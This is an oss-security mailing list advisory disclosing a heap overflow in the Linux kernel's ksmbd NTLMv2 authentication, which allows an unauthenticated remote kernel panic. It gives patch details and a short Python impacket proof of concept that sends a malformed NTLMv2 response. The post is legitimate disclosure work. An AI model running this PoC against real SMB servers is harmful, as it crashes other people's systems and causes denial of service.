Received: (qmail 23864 invoked by uid 550); 4 Jan 2023 17:03:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32355 invoked from network); 4 Jan 2023 16:35:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=DNRhKQwvF0hgVuojB/2UmmUU4hjmUmnk8Ylan4/F1aw=;
        b=hppX39ETBhcojAWhSzQ6hPRgwr2yiD21GOBLrpc71gBew2YPx9doZKhfvgPvqopWh2
         MBM+yyma23JgTr1QuhMl/2s++1t8/SIut3zCCrdcCRnreCMR6Z7Z2LzxrIgdEarpS6he
         e9p+qsRWIgkq57zJQ0iXfrRLWAA/6MCMX1oNQx5clJA2k+0YlnPGfw+oQOXo7WMef6cA
         GVbTKxlbcQDC5CKlCo2x4pNG0I65hoS0oeCkjWhfqupmWgaGW6EALV95tyafD5muH98t
         P6FuoIo9yvOvGNzAy1+KG4F80bRRhPGjdPmKleTjqDwhpgBrHOwyAe3lUSMNZn1Ef5In
         +Ajg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=DNRhKQwvF0hgVuojB/2UmmUU4hjmUmnk8Ylan4/F1aw=;
        b=uy8d/G4Zp4VT4oOB2IEDPIpP6jQA336z0wvCENWmibhn31SRbfX17iNvgURtKDJpvq
         +z9RnByaeE1KXy8LUeituR7Kp1bhQnkDiDDqrk4EDekFqH/kxfs7hxQk+Wg33ueQXeEU
         KpbSJPx3Ri0cbgU1+gj3i+l33S2X1tfot6zpDxg0Lbm6LxeI86bh9f1LpA8PsK8ZXdzj
         x2L7gMHlb83Wo292hyVJBduQk6nPDgwg7irRCaTTbmD/KRD9dS9wFQY5l8Bz/1nOg0Ey
         3yMGkNcD6NfJ/0MNmnk1AwFJcQMHEJn39xZowZiROkrk6pMzCLiHW48Yl5dtE4O6Bufr
         u54Q==
X-Gm-Message-State: AFqh2koa4dZd3/EafQn2soF6jsFl2x2a8evhoG5kPrhbcDd1zhKm93UN
	XlN1PwIx41aUmr0hIdk0JWFawAhbjFcwlWZMUNMYB7lhtnU=
X-Google-Smtp-Source: AMrXdXtggoCF4adXOj3/Ull/4c16okKnilx/29PRiNPyJXkRrLTcs0iuprP1fgbjcwJNGn5svB/WZ/mQsTddC1gpgw4=
X-Received: by 2002:a81:7044:0:b0:3d6:233b:7292 with SMTP id
 l65-20020a817044000000b003d6233b7292mr5774656ywc.476.1672850120452; Wed, 04
 Jan 2023 08:35:20 -0800 (PST)
MIME-Version: 1.0
From: =?UTF-8?B?SHJ2b2plIE1pxaFldGnEhw==?= <misetichrvoje@gmail.com>
Date: Wed, 4 Jan 2023 17:35:09 +0100
Message-ID: <CAGakKvz79Ey501w4LwNsMv4zj6LyYdagNyXWOrEt5Kus9xUmuQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: will@willsroot.io
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] Linux kernel: Unauthenticated remote DOS in ksmbd NTLMv2 authentication

There is a heap overflow bug in ksmbd_decode_ntlmssp_auth_blob in which nt_=
len
can be less than CIFS_ENCPWD_SIZE. This results in a negative blen argument
for ksmbd_auth_ntlmv2, where it calls memcpy using blen on memory allocated
by kmalloc(blen + CIFS_CRYPTO_KEY_SIZE). Note that CIFS_ENCPWD_SIZE is 16
and CIFS_CRYPTO_KEY_SIZE is 8. We believe this bug can only result in a
remote DOS and not privilege escalation nor RCE, as the heap overflow occurs
when blen is in range (-8, -1]. The resulting overflow will be too large,
and will lead to a kernel panic. When blen is -8, kmalloc returns
ZERO_SIZE_PTR which will cause a null dereference, but the kernel will oops
and will usually continue to function. This bug has existed since 5.15-rc1
and is still present in the upstream source tree, having just been patched
in https://github.com/cifsd-team/ksmbd and is awaiting merging - the commit
ID is 8824b7af409f51f1316e92e9887c2fd48c0b26d6.

We have tested this bug on Ubuntu 20.04 HWE and 22.04 (both running on
5.15.0-56-generic) and can remotely panic the OS immediately. Any attacker
that can access the ksmbd SMB port can easily cause a kernel panic. Note th=
at
while the attacker has to know a valid username for the service, it does not
need to know the password as the bug happens in the challenge-response phase
of ntlmv2 protocol, making this an unauthenticated attack.

Below is a POC to trigger the bug.
---------------------------------------------------------------------------=
---
#!/usr/bin/python3
from impacket.smbconnection import SMBConnection
import functools
import impacket.ntlm

# using impacket-0.10.0

user =3D "test"
pw =3D "test"
domain =3D "localhost"
address =3D "127.0.0.1"
target_ip =3D "127.0.0.1"
port =3D "445"

def post_function(function, postfunction):
    @functools.wraps(function)
    def run(*args, **kwargs):
        resp =3D function(*args, **kwargs)
        return postfunction(resp)
    return run

def post_computeResponseNTLMv2_hook(resp):
    return ('A' * 10, resp[1], resp[2])

impacket.ntlm.computeResponseNTLMv2 =3D post_function(
    impacket.ntlm.computeResponseNTLMv2, post_computeResponseNTLMv2_hook)

smbClient =3D SMBConnection(address, target_ip, port)
smbClient.login(user, pw, domain)
---------------------------------------------------------------------------=
---
Best,
Hrvoje Mi=C5=A1eti=C4=87
William Liu
